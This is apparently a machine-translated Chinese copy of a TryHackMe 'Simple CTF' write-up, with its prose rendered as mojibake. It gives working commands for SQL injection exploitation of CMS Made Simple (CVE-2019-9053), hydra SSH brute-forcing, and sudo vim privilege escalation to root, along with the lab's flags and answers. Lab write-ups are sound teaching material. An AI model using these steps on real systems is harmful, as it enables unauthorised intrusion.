# ç®€å• CTF(ç‰¹å†™)

> åŸæ–‡ï¼š<https://infosecwriteups.com/simple-ctf-write-up-7940aa287225?source=collection_archive---------0----------------------->

![](img/6f63a04b65e3b85c03c467bf80dacdc0.png)

# ä»‹ç»

è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹å®¹æ˜“çš„[æˆ¿é—´](https://tryhackme.com/room/easyctf)è®©ä½ å¼€å§‹ä½¿ç”¨ CTFsï¼Œéšæ—¶å¯ä»¥åœ¨ [Twitter](https://twitter.com/Nouureldin_Ehab) å’Œ [Linkedin](https://www.linkedin.com/in/noureldin-ehab-a57940190/) ä¸Šé—®æˆ‘ä»»ä½•é—®é¢˜

# ä¾¦å¯Ÿ

åœ¨ä»»ä½• CTF ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯ä½¿ç”¨ [Nmap](https://nmap.org/) æ‰«æå¼€æ”¾çš„ç«¯å£(å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ Nmapï¼Œæˆ‘å»ºè®®ä½ æŸ¥çœ‹ä¸€ä¸‹[è¿™ä¸ªæˆ¿é—´](https://tryhackme.com/room/furthernmap)

```
sudo nmap -sS -sV {Add your machine ip here}
```

-sS æ ‡å¿—ç”¨äº TCP SYN æ‰«æ

-sV æ ‡å¿—ç”¨äºç‰ˆæœ¬æ‰«æ

è¯·è®¿é—®[æ–‡æ¡£](https://nmap.org/docs.html)äº†è§£æ›´å¤šå…³äºæ ‡å¿—ä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒä»¬çš„ä¿¡æ¯

![](img/5553d1a6b78d67ad8f0ed6e76e24beb4.png)

(è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ç«¯å£ 21(FTP)ã€88(HTTP)ã€2222(ssh)æ˜¯æ‰“å¼€çš„)

**ç«¯å£ 1000 ä¸‹è¿è¡Œå¤šå°‘æœåŠ¡ï¼Ÿ**

*   `2`
*   **åœ¨æ›´é«˜çš„ç«¯å£ä¸Šè¿è¡Œçš„æ˜¯ä»€ä¹ˆï¼Ÿ**
*   `ssh`

ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†æ‰“å¼€çš„ç«¯å£ï¼Œæˆ‘å†³å®šæ£€æŸ¥å®ƒä»¬ï¼Œè®©æˆ‘ä»¬ä» FTP å¼€å§‹

**FTP(21):**
æˆ‘è¯•ç€ç”¨ FTP è¿æ¥åˆ°æœºå™¨

```
ftp {Add your machine ip here}
```

ä½†ç»“æœæ˜¯ä¸€ä¸ªå…”å­æ´ã€‚

**HTTP(88):**
è¿™æ˜¯ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œæ‰€ä»¥æˆ‘å°è¯•é€šè¿‡åœ¨æµè§ˆå™¨ä¸­å†™å…¥æœºå™¨ ip åœ°å€æ¥è¿æ¥å®ƒ

![](img/f30c1269c58d13e8de98561c0be156ba.png)

æˆ‘å†³å®šç”¨ä¸€ä¸ªå«åš [dir buster](https://tools.kali.org/web-applications/dirbuster) çš„å·¥å…·æ¥å¼ºè¡Œæ‰“å¼€è¿™ä¸ªç›®å½•(è¿™æ˜¯ä¸€ä¸ªé¢„å…ˆä¸‹è½½çš„ kali å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·æ˜¯ç”± OWASP å¼€å‘çš„)

```
dirb http://{Add your machine ip here}/
```

![](img/da702b7549ec3834ba9bf944cc4e4967.png)

å¤ªæ£’äº†ï¼Œç°åœ¨æˆ‘ä»¬å‘ç°å‡ ä¸ªç›®å½•ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹

å…ˆè¯´`/simple`

**è®¿é—®:**

```
http://{Add your machine ip here}/simple/
```

![](img/1716db2c4af9173d8041ef961680d30c.png)

(å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ CMSï¼Œæˆ‘çœŸçš„æ¨èä½ é˜…è¯»è¿™ä¸ª[åšå®¢](https://kinsta.com/knowledgebase/content-management-system/)

æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼Œè¿™æ˜¯ä¸€ä¸ªå†…å®¹ç®¡ç†å™¨(CMS)ï¼Œç§°ä¸ºâ€œCMS ä½¿ç®€å•â€ã€‚è®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦æœ‰è¿™ä¸ª CMS çš„ç®€å†

![](img/22d98cd67059b58ac0c9682a089a2122.png)

å¦‚æœæˆ‘ä»¬ä»”ç»†æ£€æŸ¥ç½‘ç«™ï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿçœ‹åˆ° CMS ç‰ˆæœ¬(2.2.8)

# å¨èƒå»ºæ¨¡

é€šè¿‡ä½¿ç”¨ä¸€ä¸ªå«åš searchsploit çš„å·¥å…·(è¿™æ˜¯ä¸€ä¸ªæœç´¢è‘—åç½‘ç«™[æ¼æ´æ•°æ®åº“](https://www.exploit-db.com/searchsploit)å¯»æ‰¾ CVEs çš„å·¥å…·)

```
searchsploit cms made simple 2.2.8
```

![](img/242b526407187c27f9258a29ca4f4f1f.png)

(å¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äº SQL æ³¨å…¥çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹è¿™ä¸ª[åšå®¢](https://www.w3schools.com/sql/sql_injection.asp)

å› ä¸ºæˆ‘ä»¬çœ‹åˆ°å®ƒå®¹æ˜“å—åˆ° SQL æ³¨å…¥çš„æ”»å‡»

æˆ‘ä»¬å¯ä»¥é€šè¿‡è°·æ­Œæœç´¢æ‰¾åˆ° CVE çš„ç”µè¯å·ç 

![](img/12c6f97be9c3665c4765d9060ed22044.png)

*   **ä½ å¯¹åº”ç”¨ç¨‹åºä½¿ç”¨çš„ CVE æ˜¯ä»€ä¹ˆï¼Ÿ**
*   `CVE-2019-9053`

æ­£å¦‚æˆ‘ä»¬å‰é¢çœ‹åˆ°çš„,â€œCMS å˜å¾—ç®€å•â€å®¹æ˜“å—åˆ° SQL æ³¨å…¥çš„æ”»å‡»

*   **åº”ç”¨ç¨‹åºæ˜“å—å“ªç§æ¼æ´çš„æ”»å‡»ï¼Ÿ**
*   `SQLi`

# å‰¥å‰Š

![](img/fddaacf580c2cadeecce1fde8aa28565.png)

ç°åœ¨æˆ‘ä»¬å°†ä½¿ç”¨æˆ‘ä»¬å‘ç°çš„æ¼æ´ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬ä½¿ç”¨ searchsploit å‘ç°çš„ python æ¨¡å—

```
searchsploit -m 46635
```

å¦‚æœè®¾ç½®äº†-c æ ‡å¿—ï¼Œpython è„šæœ¬éœ€è¦ä¸€ä¸ª ip åœ°å€å’Œä¸€ä¸ªå¯é€‰çš„å•è¯åˆ—è¡¨ã€‚
(ä¸ºäº†é¿å…è¿è¡Œè„šæœ¬æ—¶å‡ºç°ä»»ä½•é—®é¢˜ï¼Œè¯·ä½¿ç”¨ python2 å¹¶ç¡®ä¿ä¸‹è½½(termcolor å’Œ requests)å®ƒä»¬æ˜¯è„šæœ¬ä½¿ç”¨çš„ python æ¨¡å—ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ pip install ä¸‹è½½å®ƒä»¬)

ç°åœ¨è®©æˆ‘ä»¬è¿è¡Œè„šæœ¬:

```
python 46635.py -u http://{Add your machine ip here}:80/simple --wordlist=/usr/share/wordlists/rockyou.txt -c[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

ç°åœ¨ï¼Œæ—¢ç„¶æˆ‘ä»¬æœ‰äº†ä¸€ä¸ª hashï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ [HashCat](https://hashcat.net/hashcat/) æ¥ç ´è§£å®ƒ

![](img/3b15612beecc8c8ce509a3aa9d63fb64.png)

æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼ŒHashcat æ— æ³•ç ´è§£å®ƒï¼Œæ‰€ä»¥æˆ‘å°è¯•äº†[å¼€è†›æ‰‹çº¦ç¿°](https://www.openwall.com/john/)ä½†ä¹Ÿå¤±è´¥äº†ï¼Œæ‰€ä»¥æˆ‘å†³å®šå°è¯•[ä¹å¤´è›‡](https://github.com/vanhauser-thc/thc-hydra)æš´åŠ›ç ´è§£ sshï¼Œå› ä¸ºç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªç”¨æˆ·å(ç±³å¥‡)

```
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://{Add your machine ip here}:2222 -t 4
```

![](img/74cafcc051b150dd7ca07ef6fd9b01ff.png)

*   **å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ**
*   `secret`
*   ä½¿ç”¨è·å¾—çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥åœ¨å“ªé‡Œç™»å½•ï¼Ÿ
*   `ssh`

ç°åœ¨ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ç”¨æˆ·å(mitch)å’Œå¯†ç (secret ),æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ssh è¿æ¥åˆ°æœºå™¨

```
ssh mitch@{Add your machine ip here} -p 2222
```

![](img/61b9d6156b892f5c7cab3155d6ea5c36.png)

ç°åœ¨æˆ‘ä»¬åœ¨ yaaaaaaaaaaaay

![](img/f8d78c561bca8a349b072883cc645acf.png)

å½“æ‚¨å†™ä¸‹`whoami`æ—¶ï¼Œæ‚¨ä¼šçœ‹åˆ°æˆ‘ä»¬ä»¥â€œmitchâ€çš„èº«ä»½ç™»å½•

ç°åœ¨æˆ‘ä»¬å°†ç¼–å†™`ls`æ¥æŸ¥çœ‹å½“å‰ç›®å½•ä¸­æœ‰å“ªäº›æ–‡ä»¶

![](img/cea81856bc2ec037573172fe8124a493.png)

æˆ‘ä»¬çœ‹åˆ°åªæœ‰ä¸€ä¸ªåä¸ºâ€œuser.txtâ€çš„æ–‡ä»¶

æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨`cat user.txt`æ¥è¿è¡Œæ–‡ä»¶

![](img/152bf85edb53ba1dad85ef15a3fa7949.png)

*   **ç”¨æˆ·æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿ**
*   `G00d j0b, keep up!`

ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨`cd ..`è½¬åˆ°æ ¹ç›®å½•ï¼Œç„¶åä½¿ç”¨`ls`æŸ¥çœ‹é™¤ mitch ä¹‹å¤–æ˜¯å¦è¿˜æœ‰å…¶ä»–ç”¨æˆ·

![](img/861b1d2d208482ddccbfa34b8ca3f8fd.png)

*   **ä¸»ç›®å½•ä¸­è¿˜æœ‰å…¶ä»–ç”¨æˆ·å—ï¼Ÿå®ƒå«ä»€ä¹ˆåå­—ï¼Ÿ**
*   `Sunbath`

# åˆ©ç”¨å(æƒé™æå‡)

ä¸ºäº†æœ‰ä¸€ä¸ªæ›´ç¨³å®šçš„ shellï¼Œæˆ‘ä»¬éœ€è¦è¿è¡Œ`/bin/bash`

ç°åœ¨æˆ‘ä»¬éœ€è¦è¿è¡Œ`sudo -l`æ¥æŸ¥çœ‹ mitch è¢«å…è®¸ä½œä¸º root è¿è¡Œå“ªäº›å‘½ä»¤

![](img/e486faafcdc0cd3849ce683a8eb8803c.png)

åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ root è®¿é—®æƒé™è¿è¡Œ`vim`,æˆ‘å‘ç°è¿™ä¸ª[åšå®¢](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d)è§£é‡Šäº†å¦‚ä½•ä½¿ç”¨`vim` (-c æ ‡å¿—)è¿è¡Œç³»ç»Ÿå‘½ä»¤

*   **æ‚¨å¯ä»¥åˆ©ç”¨ä»€ä¹ˆæ¥ç”Ÿæˆç‰¹æƒå¤–å£³ï¼Ÿ**
*   `vim`

ç°åœ¨æˆ‘ä»¬å°†å°è¯•è¿è¡Œ`sudo vim -c '!whoami'`,çœ‹çœ‹æˆ‘ä»¬æ˜¯å¦æ˜¯ root

å®ƒå·¥ä½œäº†ï¼Œç°åœ¨è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨`sudo /usr/bin/vim -c ':!/bin/sh'`æ¥åˆ›å»ºæ ¹å¤–å£³

ç°åœ¨ï¼Œæ—¢ç„¶æˆ‘ä»¬æ˜¯æ ¹ï¼Œè®©æˆ‘ä»¬è¿è¡Œ`ls -la`

![](img/0705548791bfcc529425b8aab5548d9d.png)

ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨`cat /root/root.txt`å‘½ä»¤æ¥æŠ“å– root.txt æ–‡ä»¶

![](img/883683257846dc0fd180923edc5f3e80.png)

*   **æ ¹æ——æ˜¯ä»€ä¹ˆï¼Ÿ**
*   `W3ll d0n3\. You made it!`

# æˆ‘å–œæ¬¢ä¸ä¸åŒçš„äººè”ç³»ï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³æ‰“æ‹›å‘¼ï¼Œæˆ‘ä¼šå¾ˆé«˜å…´è§åˆ°ä½ ï¼:)

[**LinkedIn**](https://www.linkedin.com/in/noureldin-ehab-a57940190/)[**Twitter**](https://twitter.com/Nouureldin_Ehab)

ğŸ”ˆğŸ”ˆInfosec Writeups æ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰ 16 ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œ 10 å¤šä¸ªå°æ—¶å……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚ [**æŸ¥çœ‹æ›´å¤šè¯¦æƒ…ï¼Œåœ¨æ­¤æ³¨å†Œã€‚**](https://iwcon.live/)

[](https://iwcon.live/) [## IWCon2022 - Infosec ä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®

### ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦

iwcon.live](https://iwcon.live/)